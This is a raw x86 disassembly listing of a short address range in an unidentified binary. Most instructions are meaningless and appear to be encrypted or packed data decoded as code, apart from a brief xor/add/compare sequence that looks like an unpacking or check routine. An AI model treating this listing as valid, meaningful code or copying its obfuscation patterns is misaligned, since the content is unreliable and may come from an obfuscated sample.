  4166dd:	jae    0x416683
  4166df:	pop    ebp
  4166e0:	jb     0x416758
  4166e2:	mov    ah,0x6b
  4166e4:	push   0x50ba3b81
  4166e9:	xlat   BYTE PTR ds:[ebx]
  4166ea:	js     0x416689
  4166ec:	sbb    al,0x26
  4166ee:	cmp    edi,edi
  4166f0:	scas   al,BYTE PTR es:[edi]
  4166f1:	inc    eax
  4166f2:	pop    ds
  4166f3:	mov    DWORD PTR [edi-0x5397efb2],ebx
  4166f9:	in     eax,0x69
  4166fb:	iret   
  4166fc:	cdq    
  4166fd:	rol    DWORD PTR [ebx+edx*4],0xd3
  416701:	cld    
  416702:	dec    esi
  416703:	and    dh,BYTE PTR [ecx-0x5e831d6b]
  416709:	push   esi
  41670a:	push   es
  41670b:	inc    edi
  41670c:	push   ss
  41670d:	xor    DWORD PTR [esi],ebp
  41670f:	imul   edx,DWORD PTR [edi-0x47],0xbbde9261
  416716:	lds    esp,FWORD PTR [ecx-0x1a]
  416719:	jecxz  0x4166c2
  41671b:	gs sbb al,0xd1
  41671e:	jae    0x416725
  416720:	das    
  416721:	ins    BYTE PTR es:[edi],dx
  416722:	imul   edx,DWORD PTR [edi],0x4f2a7360
  416728:	add    dh,ch
  41672a:	inc    edi
  41672b:	push   esp
  41672c:	sub    esp,edx
  41672e:	mov    dh,0x2e
  416730:	sahf   
  416731:	xchg   DWORD PTR [edx+0x10],esi
  416734:	mov    edx,0xf110b2ed
  416739:	xor    ax,WORD PTR [edi]
  41673c:	rol    esi,cl
  41673e:	dec    edx
  41673f:	dec    esi
  416740:	cmc    
  416741:	mov    eax,ds:0x598c6ec
  416746:	enter  0x12b7,0x1a
  41674a:	and    BYTE PTR [ebp-0x2b],bl
  41674d:	mov    esi,0xe6c9965a
  416752:	dec    ebx
  416753:	jmp    0x41674c
  416755:	test   BYTE PTR [esi-0x6],cl
  416758:	ror    BYTE PTR [esi+0xf],cl
  41675b:	and    BYTE PTR [ebx+0x578d498],0x58
  416762:	xchg   DWORD PTR [ebx+0x4e4455d1],ebx
  416768:	adc    DWORD PTR [eax+esi*4-0x6],esi
  41676c:	scas   al,BYTE PTR es:[edi]
  41676d:	int    0xbb
  41676f:	push   edx
  416770:	jmp    FWORD PTR [esi]
  416772:	pop    ss
  416773:	ja     0x416784
  416775:	pushf  
  416776:	add    al,0xa9
  416778:	adc    edx,DWORD PTR [edx+eax*2-0x3e]
  41677c:	stc    
  41677d:	sbb    BYTE PTR [esi+0x2d98b90f],bl
  416783:	add    BYTE PTR [ecx],cl
  416785:	adc    eax,0x95ee8b37
  41678a:	es xchg edi,eax
  41678c:	ffree  st(5)
  41678e:	mov    ecx,0xad578996
  416793:	lea    ebp,[ecx]
  416795:	jecxz  0x416724
  416797:	call   0x659f523
  41679c:	pop    ebp
  41679d:	mov    bl,ch
  41679f:	dec    ecx
  4167a0:	push   ecx
  4167a1:	push   cs
  4167a2:	je     0x416755
  4167a4:	adc    al,0x30
  4167a6:	sub    ecx,DWORD PTR [ebx+eiz*2+0x4241b510]
  4167ad:	fsub   DWORD PTR [ecx-0x73fad096]
  4167b3:	fbld   TBYTE PTR [ecx]
  4167b5:	lahf   
  4167b6:	add    esp,ecx
  4167b8:	mov    al,0xeb
  4167ba:	sub    esi,DWORD PTR [esi-0x3d]
  4167bd:	lahf   
  4167be:	test   cl,bh
  4167c0:	mov    ds:0x8b2b9054,eax
  4167c5:	adc    ch,BYTE PTR ds:0x83910ec
  4167cb:	jb     0x416822
  4167cd:	in     al,0xed
  4167cf:	into   
  4167d0:	(bad)  
  4167d1:	les    ebx,FWORD PTR [edx]
  4167d3:	push   ebx
  4167d4:	mov    ah,0x60
  4167d6:	sub    al,0x70
  4167d8:	inc    ebx
  4167d9:	popa   
  4167da:	jg     0x416786
  4167dc:	mov    esi,0x966b6ff1
  4167e1:	addr16 nop
  4167e3:	sbb    al,al
  4167e5:	mov    bh,BYTE PTR [ecx+0x4c9b7c87]
  4167eb:	and    al,0x4f
  4167ed:	out    0x8c,eax
  4167ef:	add    edx,DWORD PTR [ebx+0x313d9049]
  4167f5:	pop    eax
  4167f6:	xchg   edx,eax
  4167f7:	call   0x8963:0x5fcd76c7
  4167fe:	add    DWORD PTR [ebx+0x18e9f845],ecx
  416804:	or     eax,DWORD PTR [eax]
  416806:	add    cl,ch
  416808:	mov    bl,0x2
  41680a:	add    BYTE PTR [eax],al
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	sbb    eax,0x768816f7
  41681d:	and    edi,DWORD PTR [edi+0x78]
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x416896
  416825:	lods   al,BYTE PTR ds:[esi]
  416826:	sbb    al,bl
  416828:	cmp    eax,0x6c1c060e
  41682d:	enter  0xea43,0x12
  416831:	xor    BYTE PTR [edx+0x50],al
  416834:	cmp    al,0x83
  416836:	adc    edi,esi
  416838:	out    0x6f,al
  41683a:	and    al,0xc3
  41683c:	pop    edi
  41683d:	retf   0xb60f
  416840:	sbb    ecx,DWORD PTR [esi-0x7]
  416843:	or     al,0xdf
  416845:	push   ebx
  416846:	push   ebp
  416847:	xchg   edi,eax
  416848:	xor    dl,BYTE PTR [ecx+0x6eb91e39]
  41684e:	leave  
  41684f:	push   edi
  416850:	outs   dx,DWORD PTR ds:[esi]
  416851:	data16 jno 0x41685e
  416854:	ficom  DWORD PTR [edi+0xc]
  416857:	std    
  416858:	mov    dl,0x32
  41685a:	and    eax,0x142a0369
  41685f:	xor    al,0xb7
  416861:	into   
  416862:	xchg   esp,eax
  416863:	lahf   
  416864:	or     al,BYTE PTR [ecx]
  416866:	jnp    0x416880
  416868:	mov    dh,0xc2
  41686a:	or     al,BYTE PTR [eax+0x8]
  41686d:	dec    esp
  41686e:	not    BYTE PTR ds:0x342b01e
  416874:	xchg   ebx,eax
  416875:	call   0xce36:0x17fc0af0
  41687c:	sbb    al,0x90
  41687e:	adc    eax,0x1ec08373
  416883:	jnp    0x4168ce
  416885:	std    
  416886:	lods   eax,DWORD PTR ds:[esi]
  416887:	aas    
  416888:	cmp    DWORD PTR [edi+0x720ab0a4],eax
  41688e:	pusha  
  41688f:	mov    dl,0x7e
  416891:	(bad)  
  416892:	out    0xe6,eax
  416894:	or     al,0x96
  416896:	jg     0x416857
  416898:	mov    ah,dl
  41689a:	ficom  DWORD PTR [ecx+eax*8-0x1107a020]
  4168a1:	push   ss
  4168a2:	jo     0x416877
  4168a4:	add    DWORD PTR [ebp-0x18],0x74
  4168a8:	and    ebx,ebx
  4168aa:	push   esi
  4168ab:	jb     0x416902
  4168ad:	rcl    DWORD PTR [esi-0x3c33353b],0x43
  4168b4:	inc    edi
  4168b5:	pop    es
  4168b6:	push   edx
  4168b7:	xor    BYTE PTR [ecx],ch
  4168b9:	pop    edi
  4168ba:	sbb    al,0xaf
  4168bc:	pusha  
  4168bd:	dec    edx
  4168be:	div    BYTE PTR [edx+0x78]
  4168c1:	pop    ds
  4168c2:	push   ebp
  4168c3:	jmp    0xcea4:0xd63ab69e
  4168ca:	jmp    0xf70d:0xa55aee1d
  4168d1:	adc    ecx,DWORD PTR [ebx]
  4168d3:	scas   eax,DWORD PTR es:[edi]
  4168d4:	in     eax,dx
  4168d5:	sbb    al,0x10
  4168d7:	push   eax
  4168d8:	mov    ch,0x7f
  4168da:	out    dx,al
  4168db:	or     BYTE PTR [eax+0x76afdd76],bh
  4168e1:	(bad)  
  4168e2:	int    0x6d
  4168e4:	imul   ah
  4168e6:	pop    ds
  4168e7:	leave  
  4168e8:	pop    edi
  4168e9:	cmp    edi,DWORD PTR [ebp-0x42a89d4a]
  4168ef:	dec    DWORD PTR [eax+ebp*4-0x15]
  4168f3:	in     al,0xf1
  4168f5:	mov    eax,ds:0xb2f01540
  4168fa:	shl    BYTE PTR [ecx-0x4e],1
  4168fd:	shr    DWORD PTR [ecx+0x7f],1
  416900:	mov    ds:0xfdacd415,al
  416905:	pop    eax
  416906:	adc    cl,BYTE PTR [edi+0x74]
  416909:	pop    esi
  41690a:	das    
  41690b:	adc    eax,0x7d3c7ff5
  416910:	xor    bl,BYTE PTR [ecx+0x1f25a513]
  416916:	xchg   DWORD PTR [ecx-0x62cca7b8],esp
  41691c:	jb     0x41695f
  41691e:	iret   
  41691f:	jmp    0x4168c4
  416921:	inc    esp
  416922:	nop
  416923:	jae    0x41697c
  416925:	jo     0x4168b6
  416927:	ror    DWORD PTR fs:[ebp+0x37],0x27
  41692c:	and    DWORD PTR [edi+0x38b5a44b],eax
  416932:	xor    BYTE PTR [ebx-0x7],ch
  416935:	ror    BYTE PTR [ebx],1
  416937:	pop    es
  416938:	pop    ebp
  416939:	retf   
  41693a:	jge    0x416938
  41693c:	inc    esi
  41693d:	ror    DWORD PTR [eax+0x7cb81480],0x85
  416944:	inc    esi
  416945:	sbb    BYTE PTR [ebx],bh
  416947:	fnclex 
  416949:	add    al,0xb9
  41694b:	pop    ebp
  41694c:	sub    al,0xed
  41694e:	in     al,dx
  41694f:	hlt    
  416950:	pop    ds
  416951:	push   es
  416952:	ins    DWORD PTR es:[edi],dx
  416953:	sbb    ah,bl
  416955:	jbe    0x4168fb
  416957:	call   0xa7:0x638a0796
  41695e:	adc    eax,0x17c7453a
  416963:	daa    
  416964:	gs into 
  416966:	xchg   ebx,eax
  416967:	enter  0x8903,0xf7
  41696b:	std    
  41696c:	test   al,0xd8
  41696e:	icebp  
  41696f:	and    eax,DWORD PTR [ebp+ecx*1+0x1e]
  416973:	add    edx,ecx
  416975:	pop    edi
  416977:	pop    edx
  416978:	mov    ebp,0x51b9009f
  41697d:	mov    cs,WORD PTR [ebx+ebx*4+0x6b1b055a]
  416984:	mov    DWORD PTR [edi+0x251d73b9],esp
  41698a:	sbb    ebx,DWORD PTR [ecx-0x219d795d]
  416990:	inc    esi
  416991:	stos   BYTE PTR es:[edi],al
  416992:	jnp    0x4169f4
  416994:	jecxz  0x416974
  416996:	adc    dl,ah
  416998:	std    
  416999:	in     al,0x72
  41699b:	rcr    ebx,cl
  41699d:	test   BYTE PTR [edi+0x4d],bh
  4169a0:	mov    ah,0x64
  4169a2:	test   BYTE PTR [edi],al
  4169a4:	loope  0x416940
  4169a6:	dec    esi
  4169a7:	loope  0x416992
  4169a9:	(bad)  
  4169aa:	pusha  
  4169ab:	add    ch,ch
  4169ad:	arpl   dx,si
  4169af:	mov    ds,ecx
  4169b1:	test   DWORD PTR [ecx+ebp*1],edx
  4169b4:	aad    0x6f
  4169b6:	enter  0x3b5f,0x37
  4169ba:	or     al,0xd8
  4169bc:	clc    
  4169bd:	aas    
  4169be:	dec    eax
  4169bf:	pop    ecx
  4169c0:	fnsave [ebp-0x35c3a02b]
  4169c6:	lock into 
  4169c8:	lea    ebp,[edi+0x17b18716]
  4169ce:	imul   BYTE PTR [edx+0x17f14c9]
  4169d4:	sub    eax,0xa9525fea
  4169d9:	and    dl,BYTE PTR [ecx]
  4169db:	mov    dh,BYTE PTR [ecx+edx*1]
  4169de:	aaa    
  4169df:	outs   dx,BYTE PTR ds:[esi]
  4169e0:	cs sub al,0xe6
  4169e3:	mov    esp,0xb8b9c907
  4169e8:	pop    esp
  4169e9:	dec    ecx
  4169ea:	inc    esp
  4169eb:	gs (bad) 
  4169ed:	jge    0x416a52
  4169ef:	fs jle 0x4169ed
  4169f2:	or     al,0x51
  4169f4:	retf   
  4169f5:	pop    edx
  4169f6:	pop    es
  4169f7:	int3   
  4169f8:	xchg   edx,eax
  4169f9:	std    
  4169fa:	mov    edi,0xf5fdbd80
  4169ff:	adc    DWORD PTR [esi+0x17218604],esp
  416a05:	scas   eax,DWORD PTR es:[edi]
  416a06:	in     eax,dx
  416a07:	sti    
  416a08:	out    0x56,eax
  416a0a:	arpl   WORD PTR [edx],bp
  416a0c:	(bad)  
  416a0d:	pushf  
  416a0e:	cmp    BYTE PTR [eax-0x7d],al
  416a11:	sub    BYTE PTR [ebp-0x73],bh
  416a14:	xchg   edx,eax
  416a15:	outs   dx,DWORD PTR ds:[esi]
  416a16:	and    esp,DWORD PTR [ecx-0x43]
  416a19:	cwde   
  416a1a:	xchg   esi,eax
  416a1b:	dec    ebx
  416a1c:	ret    0x27d5
  416a1f:	jmp    0x416a7a
  416a21:	scas   al,BYTE PTR es:[edi]
  416a22:	js     0x416a03
  416a24:	ss je  0x4169c2
  416a27:	lds    eax,FWORD PTR [ebx-0x16f3becc]
  416a2d:	sub    DWORD PTR [ebp+0x5f],esp
  416a30:	int3   
  416a31:	and    ah,BYTE PTR [edx+eax*4+0x4ce14bb8]
  416a38:	idiv   DWORD PTR [edx-0x4f99b70e]
  416a3e:	leave  
  416a3f:	cmp    al,0x5
  416a41:	nop
  416a42:	and    BYTE PTR [ecx-0x1789d373],dl
  416a48:	inc    ecx
  416a49:	mov    esp,ecx
  416a4b:	fmul   st(7),st
  416a4d:	or     al,0x75
  416a4f:	xlat   BYTE PTR ds:[ebx]
  416a50:	and    bh,BYTE PTR [ecx-0x51a517a2]
  416a56:	push   0x38fbe942
  416a5b:	pop    edx
  416a5c:	push   es
  416a5d:	push   cs
  416a5e:	retf   0xeb7d
  416a61:	shr    DWORD PTR [eax],cl
  416a63:	mov    BYTE PTR ds:[ecx],bh
  416a66:	test   al,0xe
  416a68:	daa    
  416a69:	mov    ds:0xd3aae149,eax
  416a6e:	mov    ecx,0xadac02a9
  416a73:	in     eax,0xb
  416a75:	inc    esp
  416a76:	jae    0x416a91
  416a78:	pop    ecx
  416a79:	aas    
  416a7a:	out    dx,eax
  416a7b:	call   0x491b1abe
  416a80:	add    BYTE PTR [ebx-0x13277c63],dl
  416a86:	add    BYTE PTR [edx+edx*8],bh
  416a89:	out    0x6d,eax
  416a8b:	cwde   
  416a8c:	pop    ecx
  416a8d:	dec    ebx
  416a8e:	aam    0x51
  416a90:	cdq    
  416a91:	call   0x7568e0f6
  416a96:	test   al,0x60
  416a98:	xchg   esi,eax
  416a99:	fldenv ds:0x58a2c394
  416a9f:	add    esi,DWORD PTR [esp+eax*4+0x64551d9]
  416aa6:	mov    bh,0xa8
  416aa8:	lahf   
  416aa9:	xchg   esp,eax
  416aaa:	test   DWORD PTR [esi],eax
  416aac:	pusha  
  416aad:	sub    eax,edx
  416aaf:	mov    ah,BYTE PTR [edi+0x200cc3e8]
  416ab5:	aad    0x6b
  416ab7:	hlt    
  416ab8:	and    esp,edx
  416aba:	cmc    
  416abb:	inc    esi
  416abc:	fiadd  DWORD PTR [eax-0x22]
  416abf:	mov    eax,DWORD PTR [ebp-0x4]
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x7a64ff75
  416ad4:	cmp    al,0x45
  416ad6:	mov    ds:0x787f2093,eax
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416b00
  416ae0:	test   al,0xe4
  416ae2:	mov    eax,0x4f976019
  416ae7:	or     DWORD PTR [edx-0x5717e5a8],ebp
  416aed:	sbb    DWORD PTR [esi+eax*4-0xcbb646e],esp
  416af4:	cli    
  416af5:	xchg   ah,bl
  416af7:	pop    ebx
  416af8:	push   0xdd255e70
  416afd:	ins    BYTE PTR es:[edi],dx
  416afe:	es sbb eax,0x639c545f
  416b04:	sahf   
  416b05:	push   0x3f
  416b07:	dec    esp
  416b08:	push   edi
  416b09:	cmc    
  416b0a:	stos   DWORD PTR es:[edi],eax
  416b0b:	inc    ebp
  416b0c:	fidivr DWORD PTR [edi+0x6]
  416b0f:	rcr    BYTE PTR [eax+0x6a],0xf4
  416b13:	in     al,0xbb
  416b15:	imul   ebx,DWORD PTR [ecx-0x39],0xfffffff7
  416b19:	ret    
  416b1a:	std    
  416b1b:	jnp    0x416b4a
  416b1d:	sub    eax,DWORD PTR [ecx+0x758a888e]
  416b23:	push   ecx
  416b24:	fst    DWORD PTR [edx+esi*4+0x59f1a3ba]
  416b2b:	sahf   
  416b2c:	push   esp
  416b2d:	sub    eax,0x78946d71
  416b32:	push   es
  416b33:	stos   DWORD PTR es:[edi],eax
  416b34:	mov    gs,WORD PTR [ecx-0x4]
  416b37:	(bad)  
  416b38:	jge    0x416b5b
  416b3a:	add    DWORD PTR ds:[esi+0x58],0x1f851f36
  416b42:	mov    ecx,DWORD PTR [eax+0x2eb7221d]
  416b48:	jmp    0x416af4
  416b4a:	sar    DWORD PTR [edx+0x273844e9],0xf0
  416b51:	pop    ebp
  416b52:	addr16 push esi
  416b54:	or     esp,DWORD PTR [ebx]
  416b56:	inc    cx
  416b58:	stc    
  416b59:	je     0x416b50
  416b5b:	loopne 0x416ba0
  416b5d:	fwait
  416b5e:	push   DWORD PTR [eax-0x13]
  416b61:	loope  0x416b5f
  416b63:	retf   
  416b64:	outs   dx,BYTE PTR ds:[esi]
  416b65:	cmp    DWORD PTR [esi-0x72231c83],0xb17e6118
  416b6f:	xchg   edx,eax
  416b70:	stos   DWORD PTR es:[edi],eax
  416b71:	pop    edx
  416b72:	adc    BYTE PTR [esp],bh
  416b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b76:	jb     0x416bd4
  416b78:	cld    
  416b79:	jl     0x416b94
  416b7b:	sbb    eax,0x690f7106
  416b80:	fild   WORD PTR [eax+0x45]
  416b83:	pop    esp
  416b84:	(bad)  
  416b85:	mov    ch,0x66
  416b87:	imul   ebp,DWORD PTR fs:[ebp+0x27c1e85a],0x1b
  416b8f:	add    BYTE PTR [eax-0x45c3a447],dl
  416b95:	adc    eax,esi
  416b97:	mov    al,0x73
  416b99:	sbb    al,ah
  416b9b:	mov    ds:0x56f1ea87,eax
  416ba0:	je     0x416ba5
  416ba2:	ret    0x270
  416ba5:	adc    DWORD PTR [esi],ebp
  416ba7:	scas   al,BYTE PTR es:[edi]
  416ba8:	mov    ds:0xac900069,al
  416bad:	pop    edi
  416bae:	xor    DWORD PTR [edi+0x5d3c00f4],ebx
  416bb4:	push   0x13
  416bb6:	cmp    ebx,DWORD PTR [ecx-0x696cdeef]
  416bbc:	in     eax,0xd9
  416bbe:	jae    0x416c08
  416bc0:	and    DWORD PTR [edi],edx
  416bc2:	jmp    0x526c:0xe1c4852c
  416bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bca:	fs push cs
  416bcc:	(bad)  
  416bcd:	retf   
  416bce:	or     eax,0xe07ac776
  416bd3:	int3   
  416bd4:	pop    esi
  416bd5:	mov    eax,ds:0x7243c5c9
  416bda:	pop    esp
  416bdb:	inc    edx
  416bdc:	cmp    eax,0xa7615701
  416be1:	out    dx,eax
  416be2:	push   ecx
  416be3:	xchg   edi,eax
  416be4:	cmova  edx,DWORD PTR [edx-0x2]
  416be8:	add    BYTE PTR [esp+eax*4-0x75],ch
  416bec:	aas    
  416bed:	(bad)  
  416bee:	test   dh,dh
  416bf0:	jb     0x796dad21
  416bf6:	pop    edi
  416bf7:	sbb    eax,0xbabe8e57
  416bfc:	add    ch,BYTE PTR ss:[eax+ebx*1]
  416c00:	ret    
  416c01:	sub    al,0xe5
  416c03:	(bad)  
  416c05:	lods   al,BYTE PTR ds:[esi]
  416c06:	ret    
  416c07:	in     eax,0x1a
  416c09:	shr    cl,cl
  416c0b:	retf   
  416c0c:	lods   eax,DWORD PTR ds:[esi]
  416c0d:	jmp    0x416bfd
  416c0f:	add    BYTE PTR [eax-0x2fd836da],ah
  416c15:	stos   BYTE PTR es:[edi],al
  416c16:	inc    edx
  416c17:	pop    edx
  416c18:	mov    al,ds:0x3e2ab3cf
  416c1d:	mov    al,0xfd
  416c1f:	stos   DWORD PTR es:[edi],eax
  416c20:	dec    ebp
  416c21:	cld    
  416c22:	adc    ebx,DWORD PTR ds:0x65d86fcb
  416c28:	inc    ecx
  416c29:	int3   
  416c2a:	push   ecx
  416c2b:	inc    edx
  416c2c:	jnp    0x416bf4
  416c2e:	in     al,dx
  416c2f:	inc    edx
  416c30:	icebp  
  416c31:	mov    ds:0x5c8d0af0,eax
  416c36:	cmc    
  416c37:	cmp    edi,ebp
  416c39:	mov    ebx,0xe1fa04e5
  416c3e:	xchg   esp,eax
  416c3f:	dec    ebx
  416c40:	int    0xb9
  416c42:	jne    0x416c0a
  416c44:	pop    esi
  416c45:	cmp    BYTE PTR [edi+0x4b932914],bh
  416c4b:	jno    0x416bf1
  416c4d:	outs   dx,BYTE PTR ds:[esi]
  416c4e:	xchg   DWORD PTR [edx],edi
  416c50:	dec    esi
  416c51:	and    al,0xab
  416c53:	mov    dl,0x97
  416c55:	je     0x416c8c
  416c57:	aam    0x91
  416c59:	adc    eax,0xdfe353a6
  416c5e:	add    DWORD PTR [edi],edi
  416c60:	dec    eax
  416c61:	hlt    
  416c62:	(bad)  
  416c64:	out    0x90,al
  416c66:	sub    al,0x72
  416c68:	xor    BYTE PTR [ecx+0x532f472a],cl
  416c6e:	jg     0x64a48045
  416c74:	test   al,0x6f
  416c76:	push   cs
  416c77:	outs   dx,BYTE PTR ds:[esi]
  416c78:	in     eax,0xf2
  416c7a:	imul   ebp,DWORD PTR [esi-0xd61a3de],0x36
  416c81:	pop    esp
  416c82:	xchg   edx,eax
  416c83:	adc    BYTE PTR [eax+0x2cd7f32b],bh
  416c89:	addr16 jmp 0x416c6f
  416c8c:	adc    ebp,edi
  416c8e:	fist   WORD PTR [esi+0x260d8ef7]
  416c94:	inc    eax
  416c95:	inc    eax
  416c96:	or     al,0xb9
  416c98:	cmc    
  416c99:	enter  0x2da8,0x94
  416c9d:	and    eax,0xf6200191
  416ca2:	and    ecx,esp
  416ca4:	pop    esp
  416ca5:	stos   BYTE PTR es:[edi],al
  416ca6:	dec    esi
  416ca7:	mov    bh,0x5f
  416ca9:	ret    
  416caa:	mov    al,ds:0xdf3b4b1
  416caf:	fs inc ebx
  416cb1:	ret    0xe307
  416cb4:	dec    edx
  416cb5:	fld    TBYTE PTR [eax]
  416cb7:	add    al,0xea
  416cb9:	pop    es
  416cba:	pop    ecx
  416cbb:	js     0x416d03
  416cbd:	push   eax
  416cbe:	push   eax
  416cbf:	mov    dl,0x87
  416cc1:	outs   dx,DWORD PTR ds:[esi]
  416cc2:	lock xor eax,0x7e550cc4
  416cc8:	inc    esp
  416cc9:	fwait
  416cca:	push   0x9cb6e29a
  416ccf:	mov    bl,0xb1
  416cd1:	push   0x62
  416cd3:	cmp    esp,DWORD PTR [ebp-0x2d]
  416cd6:	adc    al,0xe3
  416cd8:	xor    edi,DWORD PTR ds:0x1919b13c
  416cde:	and    edi,esi
  416ce0:	inc    eax
  416ce1:	addr16 or eax,0xc7f0535
  416ce7:	das    
  416ce8:	fstp   TBYTE PTR [ebp-0x1e1de58b]
  416cee:	mov    DWORD PTR [edi-0x65e4ef2d],esp
  416cf4:	jbe    0x416ca0
  416cf6:	sti    
  416cf7:	in     al,0x15
  416cf9:	and    edi,DWORD PTR [esi+0x33]
  416cfc:	push   ds
  416cfd:	push   edx
  416cfe:	pop    ebp
  416cff:	ds ins DWORD PTR es:[edi],dx
  416d01:	std    
  416d02:	iret   
  416d03:	aad    0xb
  416d05:	mov    ebp,0xa225ae67
  416d0a:	push   ss
  416d0b:	imul   edi,esp,0xffffff8e
  416d0e:	pop    esp
  416d0f:	jmp    0x416cad
  416d11:	mov    edi,edx
  416d13:	sahf   
  416d14:	mov    edx,0x5a797ade
  416d19:	cwde   
  416d1a:	jge    0x416d74
  416d1c:	dec    eax
  416d1d:	in     al,0x5
  416d1f:	lea    esi,[eax]
  416d21:	xchg   BYTE PTR [edx],dh
  416d23:	ds add bh,BYTE PTR fs:[esi+0x5b]
  416d28:	sar    BYTE PTR ds:0x47edb76a,1
  416d2e:	push   eax
  416d2f:	pusha  
  416d30:	jmp    0xb24c:0xf8755d8
  416d37:	jnp    0x416d0c
  416d39:	mov    edi,0x1637b30a
  416d3e:	shl    BYTE PTR [ebx],0xf3
  416d41:	mov    eax,0xf7911eb1
  416d46:	loopne 0x416cf9
  416d48:	mov    eax,ds:0x5f83d9c7
  416d4d:	jne    0x416cf3
  416d4f:	sbb    esi,DWORD PTR [edx-0x4d]
  416d52:	mov    eax,0xc503b845
  416d57:	mov    ebp,0x37bda1ed
  416d5c:	in     al,0xe8
  416d5e:	adc    DWORD PTR [eax-0x24],ebx
  416d61:	sub    BYTE PTR [edx+edi*1],0x46
  416d65:	dec    edi
  416d66:	inc    ecx
  416d67:	pusha  
  416d68:	mov    edx,0x84b1e3ad
  416d6d:	inc    ebp
  416d6e:	fistp  QWORD PTR [edi-0x47f797fa]
  416d74:	add    ebp,eax
  416d76:	xor    DWORD PTR [ebx],eax
  416d78:	aaa    
  416d79:	pop    ecx
  416d7a:	mov    ecx,DWORD PTR [ebp+0x10]
  416d7d:	xor    eax,edi
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xaa62:0xbb161efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	pop    ds
  416db8:	test   BYTE PTR [ebp+0x8],cl
  416dbb:	into   
  416dbc:	call   0x1c31:0x41e3eb11
  416dc3:	xor    DWORD PTR [esi+0x285bbba8],edx
  416dc9:	shr    BYTE PTR [edi+edx*1-0x5b],cl
  416dcd:	lds    ebx,FWORD PTR [ebp-0x5d]
  416dd0:	test   BYTE PTR [ebx+0x11e8f14e],0x75
  416dd7:	(bad)  
  416dd8:	and    DWORD PTR [ecx+0x654f9fa0],0xfc350f0
  416de2:	dec    BYTE PTR [eax+ebp*8+0x1c830732]
  416de9:	mov    ds,WORD PTR [ecx+eiz*8-0x44e86705]
  416df0:	out    0xfb,eax
  416df2:	ins    BYTE PTR es:[edi],dx
  416df3:	addr16 leave 
  416df5:	xchg   edx,eax
  416df6:	outs   dx,DWORD PTR ds:[esi]
  416df7:	sub    eax,0x5b602419
  416dfc:	sbb    dh,BYTE PTR [ebx+0x1d]
  416dff:	jmp    FWORD PTR [eax+eax*8]
  416e02:	fcomp  st(7)
  416e04:	xor    ecx,DWORD PTR ds:0x67769f18
  416e0a:	mov    ds:0x45770dfa,al
  416e0f:	mov    eax,ds:0x64bf6838
  416e14:	jb     0x416dc0
  416e16:	mov    edi,0x9270d692
  416e1b:	adc    bl,BYTE PTR [edx]
  416e1d:	dec    edi
  416e1e:	xchg   edi,eax
  416e1f:	call   0xb5aebe75
  416e24:	inc    ecx
  416e25:	and    eax,0xadd3f607
  416e2a:	std    
  416e2b:	add    dh,BYTE PTR [ebx-0x7d0e338]
  416e31:	sub    bh,0x4d
  416e34:	push   ecx
  416e35:	push   esi
  416e36:	pmaxsw mm5,mm4
  416e39:	test   DWORD PTR ds:0xe1fc88f9,ebx
  416e3f:	mov    dl,bl
  416e41:	jmp    0xf755331
  416e46:	retf   0xf882
  416e49:	bnd jge 0x416ebe
  416e4c:	ror    BYTE PTR [esp+esi*2-0x76],cl
  416e50:	pop    es
  416e51:	bound  dx,DWORD PTR [eax]
  416e54:	jmp    0xa28f:0x702bd9db
  416e5b:	lahf   
  416e5c:	jae    0x416e10
  416e5e:	jg     0x416e05
  416e60:	lods   al,BYTE PTR ds:[esi]
  416e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e62:	xchg   edi,eax
  416e63:	mov    cs,WORD PTR [edi-0xf]
  416e66:	sbb    eax,0xaa9f2ba
  416e6b:	sahf   
  416e6c:	xlat   BYTE PTR ds:[ebx]
  416e6d:	push   ds
  416e6e:	js     0x416e31
  416e70:	push   ebp
  416e71:	sub    bh,bh
  416e73:	push   esi
  416e74:	out    0xaa,al
  416e76:	pop    es
  416e77:	fwait
  416e78:	in     al,0x4a
  416e7a:	xor    BYTE PTR [ecx],al
  416e7c:	bound  esp,QWORD PTR ds:0x16356728
  416e82:	test   eax,0x744e00af
  416e87:	pop    es
  416e88:	mov    ds:0xc7162543,eax
  416e8d:	add    DWORD PTR [esi+0x63d57814],esi
  416e93:	(bad)  
  416e94:	icebp  
  416e95:	sbb    eax,0xe20c6535
  416e9a:	xchg   edx,eax
  416e9b:	(bad)  
  416e9c:	cmp    al,0xbf
  416e9e:	lea    ecx,[edi-0x44d7bd01]
  416ea4:	xor    al,0xf1
  416ea6:	sub    DWORD PTR [edx-0x5d],ecx
  416ea9:	mov    eax,ds:0x90394906
  416eae:	inc    edi
  416eaf:	cmp    DWORD PTR [ecx+ebp*8-0x696d092b],edi
  416eb6:	or     BYTE PTR [edi+0x71],cl
  416eb9:	push   ss
  416eba:	push   ebp
  416ebb:	or     DWORD PTR [edx+edi*2+0x4e],ebp
  416ebf:	mov    esp,0xb5c1340f
  416ec4:	add    eax,0xde5dc34
  416ec9:	jae    0x416f23
  416ecb:	or     edi,DWORD PTR [eax]
  416ecd:	das    
  416ece:	jb     0x416eb8
  416ed0:	push   ecx
  416ed1:	ss inc esp
  416ed3:	(bad)  
  416ed4:	(bad)  
  416ed5:	int    0xf
  416ed7:	cs out dx,al
  416ed9:	or     BYTE PTR [eax+0x29],ch
  416edc:	dec    ebp
  416edd:	lods   eax,DWORD PTR ds:[esi]
  416ede:	dec    esp
